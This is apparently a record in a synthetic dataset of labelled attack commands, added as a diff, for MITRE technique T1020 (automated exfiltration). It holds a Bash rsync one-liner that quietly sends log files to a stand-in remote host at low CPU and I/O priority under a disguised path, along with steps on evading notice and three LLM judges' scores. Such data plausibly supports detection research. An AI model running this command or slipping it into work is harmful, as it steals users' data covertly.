@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ionice -c3 nice -n 19 rsync -azq --append-verify --update --include='*/' --include='*.log' --exclude='*' $HOME/.local/share/ backup@cdn.example.net:.cache/.lg/$HOSTNAME/",
+  "explanation": "Low-I/O, low-CPU rsync of only log files with append-verify to efficiently send new log data without re-transferring full files, consistent with automated exfiltration (T1020).",
+  "rationale_steps": [
+    "Lower resource footprint with ionice/nice to avoid suspicion.",
+    "Select only .log files using filter rules.",
+    "Use --append-verify and --update for incremental deltas.",
+    "Quiet mode hides operational output."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-2cd5e12a",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed command chaining ionice→nice→rsync with valid flags, balanced quoting, and correct rsync remote path syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "It selectively transfers only *.log files to a remote host with compression, quiet mode, and append-verify under low CPU/I/O priority, aligning with automated exfiltration workflows (scheduling would be external).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:11:55.714389Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid rsync flags, proper use of ionice/nice prefixes, correct include/exclude filter ordering, and valid shell variable expansions.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements automated exfiltration (T1020) by using low-priority I/O and CPU scheduling to avoid detection, rsync's append-verify and update flags to efficiently transfer only new log data, targeted inclusion of only *.log files from a user data directory, and exfiltration to a remote host using a disguised path (.cache/.lg/) consistent with stealth-oriented automated data transfer.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:26:10.253757Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Linux utilities, correct rsync flag syntax, and properly nested include/exclude patterns for Bash.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively demonstrates automated exfiltration by using low-priority resource scheduling and efficient incremental transfers to a remote target, perfectly matching the technique's intent.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:26:10.911580Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
